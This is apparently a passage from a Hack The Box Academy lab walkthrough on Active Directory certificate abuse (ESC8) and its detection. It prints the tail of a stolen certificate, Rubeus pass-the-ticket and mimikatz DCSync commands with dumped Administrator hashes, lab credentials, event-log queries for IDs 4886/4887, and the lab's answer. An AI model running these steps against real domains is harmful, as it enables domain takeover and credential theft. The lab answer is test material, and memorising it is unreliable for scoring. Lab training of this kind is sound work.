3QTHaR8M29ILeFcwloJjrBdRqT61CkRQfYGCo1yxdNB0W6jH1nuJCLg3DuWR6Z71g+0sD2ZwZRgkujmcwhQhjT503gibWAd8wYTG25US9XRgd6kO2Cz/c/2Pt7VmZ8fLjx0Bay56tMjts18mqDXwcB3YTny5KwtWKQwhax2M1/nK+5TScNwUyr6eCX++Xl9VexyFtJtLo8P4+dyEbRKWXqHvb3/fRdGjB+RJ1SAR2xPLZvU583fyDAE2QTPORSWQIdWrGuAI70rhELgIvlCFwLVpK2QBpfKVWO3kr9lxYuTgkjcu1BKQr9D3H2WVQanHx0sDVSXklitJyfP0Jh9ueNVWvew33DZ8Pg/oCSKYO7iMFZxi9f5nAdufSNg8318QO5LSP8gsGKxejZJppvplckN0nVUEtcWS9NF5UWHQ7SP+7qFpwg/0SrAXgRfyh7koPM+zZkxDZBk//8cL8MyVOV45b7Ea0F+EHyFbG+TK4DuhT5/ABaiIXacm2H6jTWLQT7MehrjAXE5eVlvJF3NNVrHUhVRV8lI4GL3uk8XxlUXQqkB62Q3+Xl2rquA10ry0o5SMOZ58CfXPUK4BoVZD0ZHoqPEm5ad+cekoyZBxsBgFycu2+XcVpiMmT47g1R+5w0iCCpTqgSCvNpsWBeYBBFirAlW/6y4ZjkG7xcPymjSWwd9uly8riUJk7DaOXIGoyrPGaoJ7O+J0z+J3gVFT4si7TJ9LJboGLk6ZH+HcMyYc6ylAo/w5nNyewp/h3a6IQsc8xJtzd1WwlbPtCG4YQoZhTt+CzGzSn4f3KydktQ+FiIKxBPTTk7OYcQXrK4+bR8jZhwgU7H/ZVyz3UOsX1Ng87iFcnmtOaKtlNoXXVdRyuj9RkzQhxq/JI4xfnTl5hTKb+2jvw28w6uCma0PIbEMRXCaEAz2/ASDf+qIehEUETiQy59VfsznIQ0zyDqRzD+WPRqP2rHk8TIDZ5UPm4inRso45uYUTgSQq8SsLQOLFy9ThROKkO+XQ1tzVPVyH3hoFN/1b0got6KUGgSEZh25EdIWwayFJAf9AUJXV5im7EH5d6VOSCpOiq7DRTDtM83FJXERfxreUK4SO5kqAog2+LL4I6wtLD0PKD/LVv0KtpzR2lTElMCMGCSqGSIb3DQEJFTEWBBThnXeLCsqevUpdbOJickbOYtod5TA9MDEwDQYJYIZIAWUDBAIBBQAEIFh272kwI+VnTmn6hHMvmoEWgSCNVl85Vu4TNu/wmxAFBAgq6U/rgUd+lA==
```

Now, students need to RDP to WS001 from the Kali host:

Code: shell

```shell
xfreerdp /u:bob /p:Slavi123 /v:172.16.18.25 /dynamic-resolution
```

```
┌──(kali㉿kali)-[~]
└─$ xfreerdp /u:bob /p:Slavi123 /v:172.16.18.25 /dynamic-resolution

[13:28:01:369] [5019:5020] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[13:28:01:369] [5019:5020] [WARN][com.freerdp.crypto] - CN = WS001.eagle.local
[13:28:03:674] [5019:5020] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[13:28:03:674] [5019:5020] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[13:28:03:697] [5019:5020] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[13:28:03:697] [5019:5020] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[13:28:03:697] [5019:5020] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
[13:28:04:571] [5019:5020] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]
```

Then, students need to open PowerShell as administrator and use `Rubeus` to pass the ticket. Students need to copy/paste the entire base64 encoded certificate into Rubeus:

Code: powershell

```powershell
cd C:\Users\bob\Downloads\
.\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:MIIRbQ<SNIP>
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\WINDOWS\system32> cd C:\Users\bob\Downloads\

PS C:\Users\bob\Downloads> .\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:MIIRbQ<SNIP>

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=DC2.eagle.local
[*] Building AS-REQ (w/ PKINIT preauth) for: 'eagle.local\DC2$'
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/eagle.local
  ServiceRealm             :  EAGLE.LOCAL
  UserName                 :  DC2$
  UserRealm                :  EAGLE.LOCAL
  StartTime                :  19/04/2023 19.31.03
  EndTime                  :  20/04/2023 05.31.03
  RenewTill                :  26/04/2023 19.31.03
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  LSFMfZGXay2fCqJEfF6n3Q==
  ASREP (key)              :  149EB3F831BD3E99D6766C7FCC676F60
```

Finally, with the ticket loaded into the current PowerShell session, students need to use `mimikatz.exe` to DCSync the Administrator user:

Code: powershell

```powershell
cd C:\Mimikatz
.\mimikatz.exe "lsadump::dcsync /user:Administrator" exit
```

```
PS C:\Users\bob\Downloads> cd C:\Mimikatz\

PS C:\Mimikatz> .\mimikatz.exe "lsadump::dcsync /user:Administrator" exit

  .####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .# ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 # / \ #  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 # \ / #       > https://blog.gentilkiwi.com/mimikatz
 '# v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /user:Administrator
[DC] 'eagle.local' will be the domain
[DC] 'DC1.eagle.local' will be the DC server
[DC] 'Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   : 01/01/1601 02.00.00
Password last change : 07/08/2022 21.24.13
Object Security ID   : S-1-5-21-1518138621-4282902758-752445584-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: fcdc65703dd2b0bd789977f1f3eeaecf

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 6fd69313922373216cdbbfa823bd268d

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-FM93RI8QOKQAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 1c4197df604e4da0ac46164b30e431405d23128fb37514595555cca76583cfd3
      aes128_hmac       (4096) : 4667ae9266d48c01956ab9c869e4370f
      des_cbc_md5       (4096) : d9b53b1f6d7c45a8

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-FM93RI8QOKQAdministrator
    Credentials
      des_cbc_md5       : d9b53b1f6d7c45a8
```

Having successfully completed `Coercing` + `PKI ESC8`, students need to connect to the PKI machine using `evil-winrm` and check for events `4886` and `4887`:

Code: shell

```shell
evil-winrm -i 172.16.18.15 -u htb-student -p 'HTB_@cademy_stdnt!'
Get-WinEvent -FilterHashTable @{Logname='Security'; ID='4886'}
```

```
┌──(kali㉿kali)-[~]
└─$ evil-winrm -i 172.16.18.15 -u htb-student -p 'HTB_@cademy_stdnt!'
<SNIP>

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\htb-student\Documents> Get-WinEvent -FilterHashTable @{Logname='Security'; ID='4886'}

   ProviderName: Microsoft-Windows-Security-Auditing

TimeCreated                     Id LevelDisplayName Message
-----------                     -- ---------------- -------
4/19/2023 7:25:39 PM          4886 Information      Certificate Services received a certificate request....
4/7/2023 8:51:54 PM           4886 Information      Certificate Services received a certificate request....
12/19/2022 11:35:45 PM        4886 Information      Certificate Services received a certificate request....
12/19/2022 10:12:01 PM        4886 Information      Certificate Services received a certificate request....
12/19/2022 10:11:14 PM        4886 Information      Certificate Services received a certificate request....
```

Students need to save the events into an array and view the most recent event in the array at position `[0]`:

```
$events = Get-WinEvent -FilterHashTable @{Logname='Security'; ID='4886'}
$events[0] | Format-List -Property
```
```
*Evil-WinRM* PS C:\Users\htb-student\Documents> $events = Get-WinEvent -FilterHashTable @{Logname='Security'; ID='4886'}

*Evil-WinRM* PS C:\Users\htb-student\Documents> $events[0] | Format-List -Property *

Message              : Certificate Services received a certificate request.

                       Request ID:      50
                       Requester:       EAGLE\DC2$
                       Attributes:
                       CertificateTemplate:DomainController
                       ccm:PKI.eagle.local
Id                   : 4886
Version              : 0
Qualifiers           :
Level                : 0
Task                 : 12805
Opcode               : 0
Keywords             : -9214364837600034816
RecordId             : 21083
ProviderName         : Microsoft-Windows-Security-Auditing
ProviderId           : 54849625-5478-4994-a5ba-3e3b0328c30d
LogName              : Security
ProcessId            : 696
ThreadId             : 804
MachineName          : PKI.eagle.local
UserId               :
TimeCreated          : 4/19/2023 7:25:39 PM
ActivityId           : 32a62502-72e0-0003-6c25-a632e072d901
RelatedActivityId    :
ContainerLog         : Security
MatchedQueryIds      : {}
Bookmark             : System.Diagnostics.Eventing.Reader.EventBookmark
LevelDisplayName     : Information
OpcodeDisplayName    : Info
TaskDisplayName      : Certification Services
KeywordsDisplayNames : {Audit Success}
Properties           : {System.Diagnostics.Eventing.Reader.EventProperty, System.Diagnostics.Eventing.Reader.EventProperty, System.Diagnostics.Eventing.Reader.EventProperty}
```

Students will notice `EAGLE\DC2$` on the Requester field of the 4886 and 4887 event logs.

Answer: `EAGLE\DC2$`